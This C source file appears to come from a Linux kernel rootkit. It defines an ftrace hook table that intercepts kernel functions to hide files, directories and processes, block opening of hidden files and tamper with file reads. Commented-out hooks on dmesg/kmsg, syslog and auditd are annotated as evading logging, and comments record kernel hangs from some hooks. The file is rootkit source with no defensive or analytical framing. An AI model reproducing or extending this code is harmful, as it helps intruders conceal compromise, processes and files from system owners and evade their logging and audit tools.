#include "../header_files/all_hooks_headers.h"

#define write_zero	"write_null"
static struct ftrace_hook hooks[] = {
	HOOK(write_zero, rk_write_zero, &orig_write_zero),
	//HOOK("devkmsg_read", rk_devkmsg_read, &orig_devkmsg_read),  /* hook /dev/kmsg or /proc/kmsg to avoid dmesg logging us */
	//HOOK("do_syslog" ,  rk_do_syslog,  &orig_do_syslog), /* syslog*/
	//HOOK("audit_alloc" ,  rk_audit_alloc,  &orig_audit_alloc), /* auditd */
	
	#ifdef CONFIG_FILE_TAMPERING
		HOOK("vfs_read", rk_vfs_read, &orig_vfs_read),
	#endif

	#ifdef CONFIG_NO_WRITE
		//HOOK("vfs_write", rk_vfs_write, &orig_vfs_write),  // deactivate it because it makes the kernel hang, probably because there is so many files to handles
	#endif


	
	#ifdef CONFIG_HIDE_DIR_AND_FILES
		HOOK("filldir", rk_filldir, &orig_filldir),
		HOOK("filldir64" ,  rk_filldir64,  &orig_filldir64),
		HOOK("fillonedir", rk_fillonedir, &orig_fillonedir),
		HOOK("compat_fillonedir", rk_compat_fillonedir, &orig_compat_fillonedir),
		HOOK("compat_filldir" ,  rk_compat_filldir,  &orig_compat_filldir),
		HOOK("d_lookup" ,  rk_d_lookup,  &orig_d_lookup),
		HOOK("__d_lookup" ,  rk___d_lookup,  &orig___d_lookup),
		HOOK("user_path_at_empty" ,  rk_user_path_at_empty,  &orig_user_path_at_empty),
	#endif

	#ifdef CONFIG_NO_OPEN_HIDDEN
		HOOK("do_sys_openat2" ,  rk_do_sys_openat2,  &orig_do_sys_openat2),
	#endif

	#ifdef CONFIG_NO_DELETE
		//HOOK("do_unlinkat", rk_do_unlinkat, &orig_do_unlinkat),   // same the kernel hangs probably because many temporary file to be delected, but no worries, when activate no_open , you cannot delete because the delete call fstat first which call user_path_at_empty which is already controlled so ....
	#endif

	#ifdef CONFIG_HIDE_PROCESS
		HOOK("copy_creds", rk_copy_creds, &orig_copy_creds),
		HOOK("exit_creds", rk_exit_creds, &orig_exit_creds),
		HOOK("find_task_by_vpid", rk_find_task_by_vpid, &orig_find_task_by_vpid),
		HOOK("vfs_getattr" ,  rk_vfs_getattr,  &orig_vfs_getattr),
		//HOOK("vfs_statx", rk_vfs_statx, &orig_vfs_statx),
		HOOK(SYSCALL_NAME("sys_kill"), rk___x64_sys_kill, &orig___x64_sys_kill),
		HOOK("next_tgid", rk_next_tgid, &orig_next_tgid),
		HOOK("account_process_tick", rk_account_process_tick, &orig_account_process_tick),
	#endif

};






